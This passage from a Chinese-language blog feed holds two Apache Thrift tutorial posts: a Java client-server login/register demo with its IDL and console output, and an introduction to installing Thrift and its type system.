&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; me.wuchong.thrift.impl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Account;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.server.TServer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.server.TSimpleServer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.transport.TServerSocket;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * Created by wuchong on 15/10/7.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;AccountServer&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TServerSocket socket = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TServerSocket(&lt;span class=&quot;number&quot;&gt;9999&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Account.Processor processor = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Account.Processor&amp;lt;&amp;gt;(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; AccountService());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TServer server = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TSimpleServer(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TServer.Args(socket).processor(processor));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;Starting the Account server...&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        server.serve();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行之后，可以在控制台看到输出：&lt;br&gt;&lt;figure class=&quot;highlight axapta&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Starting the Account &lt;span class=&quot;keyword&quot;&gt;server&lt;/span&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;目前服务已经启动，则在客户端就可以进行RPC调用了。启动客户端的代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; me.wuchong.thrift.impl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Account;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.InvalidOperation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Operation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Request;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.TException;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.protocol.TBinaryProtocol;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.protocol.TProtocol;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.transport.TSocket;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.thrift.transport.TTransport;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * Created by wuchong on 15/10/7.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;AccountClient&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; TException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TTransport transport = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TSocket(&lt;span class=&quot;string&quot;&gt;&quot;localhost&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9999&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        transport.open();   &lt;span class=&quot;comment&quot;&gt;//建立连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TProtocol protocol = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TBinaryProtocol(transport);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Account.Client client = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Account.Client(protocol);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//第一个请求， 登录 wuchong 帐号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Request req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Request(&lt;span class=&quot;string&quot;&gt;&quot;wuchong&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;, Operation.LOGIN);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        request(client, req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//第二个请求， 注册 wuchong 帐号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        req.setOp(Operation.REGISTER);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        request(client, req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//第三个请求， 登录 wuchong 帐号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        req.setOp(Operation.LOGIN);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        request(client, req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//第四个请求， name 为空的请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        req.setName(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        request(client, req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        transport.close();  &lt;span class=&quot;comment&quot;&gt;//关闭连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Account.Client client, Request req)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; TException&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            String result = client.doAction(req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            System.out.println(result);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (InvalidOperation e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            System.out.println(e.reason);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行客户端，其结果如下所示。&lt;/p&gt;
&lt;figure class=&quot;highlight smali&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Login failed!! please&lt;span class=&quot;built_in&quot;&gt; check &lt;/span&gt;your username&lt;span class=&quot;built_in&quot;&gt; and &lt;/span&gt;password&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Register success!! Hello wuchong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Login success!! Hello wuchong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;param name should&lt;span class=&quot;built_in&quot;&gt; not &lt;/span&gt;be empty&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而此时，服务端会打印出收到的请求信息。&lt;/p&gt;
&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Starting the Account server...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Get request[&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt;wuchong, &lt;span class=&quot;string&quot;&gt;pass:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1234&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;op:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Get request[&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt;wuchong, &lt;span class=&quot;string&quot;&gt;pass:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1234&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;op:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Get request[&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt;wuchong, &lt;span class=&quot;string&quot;&gt;pass:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1234&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;op:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Get request[&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;pass:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1234&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;op:&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;你可以发现，只需要几行代码，我们就实现了高效的RPC通信。&lt;/p&gt;
&lt;p&gt;##参考资料&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://diwakergupta.github.io/thrift-missing-guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Thrift: The Missing Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://thrift-tutorial.readthedocs.org/en/latest/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Thrift Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/p/0f4113d6ec4b&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;thrift入门教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;/blog/2015/10/07/thrift-induction&quot;&gt;上一篇文章&lt;/a&gt;我们了解了thrift的概念以及类型系统，本文我们通过一个简单的实例来更深入地了解thrift的使用。我们的实例非常简单，就是实现一个登录注册功能，其用户名密码缓存在内存中。&lt;/p&gt;
&lt;h2 id=&quot;编写thrift文件&quot;&gt;&lt;a href=&quot;#编写thrift文件&quot; class=&quot;headerlink&quot; title=&quot;编写thrift文件&quot;&gt;&lt;/a&gt;编写thrift文件&lt;/h2&gt;&lt;p&gt;我们编写一个&lt;code&gt;account.thrift&lt;/code&gt;的文件。&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; java me.wuchong.thrift.generated&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; Operation&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  LOGIN = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  REGISTER = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; Request&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; name,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; password,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;: Operation op&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;exception InvalidOperation&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: i32 code,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; reason&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;service Account&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;doAction&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: Request request)&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: InvalidOperation e)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="教程" scheme="http://wuchong.me/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="thrift" scheme="http://wuchong.me/tags/thrift/"/>
    
  </entry>
  
  <entry>
    <title>Thrift 入门</title>
    <link href="http://wuchong.me/blog/2015/10/07/thrift-induction/"/>
    <id>http://wuchong.me/blog/2015/10/07/thrift-induction/</id>
    <published>2015-10-07T12:08:35.000Z</published>
    <updated>2015-10-08T01:33:09.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;Thrift 最初由Facebook开发，而后捐献给Apache，目前已广泛应用于业界。Thrift 正如其&lt;a href=&quot;https://thrift.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方主页&lt;/a&gt;介绍的，“是一种可扩展、跨语言的服务开发框架”。简而言之，它主要用于各个服务之间的RPC通信，其服务端和客户端可以用不同的语言来开发。只需要依照IDL（Interface Description Language）定义一次接口，Thrift工具就能自动生成 C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, and OCaml等语言的代码。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;Thrift的安装还是有些繁琐的，跟着&lt;a href=&quot;https://thrift.apache.org/docs/install/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方文档&lt;/a&gt;的走就可以。如果你是Mac OS X， 这里有更方便的方法。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;brew install boost&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;brew install libevent&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;brew install thrift&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gem install thrift -- --with-cppflags=&amp;apos;-D_FORTIFY_SOURCE=0&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不过注意上述方法默认安装的最新版。&lt;/p&gt;
&lt;h2 id=&quot;Thrift-类型系统&quot;&gt;&lt;a href=&quot;#Thrift-类型系统&quot; class=&quot;headerlink&quot; title=&quot;Thrift 类型系统&quot;&gt;&lt;/a&gt;Thrift 类型系统&lt;/h2&gt;&lt;p&gt;thrfit的类型系统包括了基本类型，比如bool, byte, double, string和int。也提供了特殊类型如binary，提供了structs（等同于无继承的class），还提供了容器类型（list,set,map）。&lt;/p&gt;
&lt;h3 id=&quot;基本类型-basic-types&quot;&gt;&lt;a href=&quot;#基本类型-basic-types&quot; class=&quot;headerlink&quot; title=&quot;基本类型(basic types)&quot;&gt;&lt;/a&gt;基本类型(basic types)&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;bool: 布尔变量&lt;/li&gt;
&lt;li&gt;byte: 8位有符号整数&lt;/li&gt;
&lt;li&gt;i16: 16位有符号整数&lt;/li&gt;
&lt;li&gt;i32: 32位有符号整数&lt;/li&gt;
&lt;li&gt;i64: 64位有符号整数&lt;/li&gt;
&lt;li&gt;double: 64位浮点数&lt;/li&gt;
&lt;li&gt;string: 字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;注：thrift不支持无符号整数类型，因为很多编程语言不存在无符号类型，比如java&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;特殊类型-special-types&quot;&gt;&lt;a href=&quot;#特殊类型-special-types&quot; class=&quot;headerlink&quot; title=&quot;特殊类型(special types)&quot;&gt;&lt;/a&gt;特殊类型(special types)&lt;/h3&gt;&lt;p&gt;binary: 未编码的字节序列&lt;/p&gt;
&lt;h3 id=&quot;枚举-enum&quot;&gt;&lt;a href=&quot;#枚举-enum&quot; class=&quot;headerlink&quot; title=&quot;枚举(enum)&quot;&gt;&lt;/a&gt;枚举(enum)&lt;/h3&gt;&lt;p&gt;枚举的定义形式和Java的Enum定义差不多，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; Sex &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MALE,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    FEMALE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;容器类型-container&quot;&gt;&lt;a href=&quot;#容器类型-container&quot; class=&quot;headerlink&quot; title=&quot;容器类型(container)&quot;&gt;&lt;/a&gt;容器类型(container)&lt;/h3&gt;&lt;p&gt;集合中的元素可以是除了service之外的任何类型，包括exception。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;list&lt;t&gt;: 一系列由T类型的数据组成的有序列表，元素可以重复&lt;/t&gt;&lt;/li&gt;
&lt;li&gt;set&lt;t&gt;: 一系列由T类型的数据组成的无序集合，元素不可重复&lt;/t&gt;&lt;/li&gt;
&lt;li&gt;map&lt;k, v=&quot;&quot;&gt;: 一个字典结构，key为K类型，value为V类型&lt;/k,&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;结构体-struct&quot;&gt;&lt;a href=&quot;#结构体-struct&quot; class=&quot;headerlink&quot; title=&quot;结构体(struct)&quot;&gt;&lt;/a&gt;结构体(struct)&lt;/h3&gt;&lt;p&gt;结构体中包含一系列的强类型域，等同于无继承的class。可以看出struct写法很类似C语言的结构体。&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; Example &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:i32 number=&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:i64 bigNumber,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;&amp;lt;&lt;span class=&quot;keyword&quot;&gt;double&lt;/span&gt;&amp;gt; decimals,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;:&lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; name=&lt;span class=&quot;string&quot;&gt;&quot;thrifty&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;可选与必选&quot;&gt;&lt;a href=&quot;#可选与必选&quot; class=&quot;headerlink&quot; title=&quot;可选与必选&quot;&gt;&lt;/a&gt;可选与必选&lt;/h3&gt;&lt;p&gt;thrift提供两个关键字&lt;code&gt;required&lt;/code&gt;，&lt;code&gt;optional&lt;/code&gt;，分别用于表示对应的字段时必填的还是可选的。例如：&lt;/p&gt;
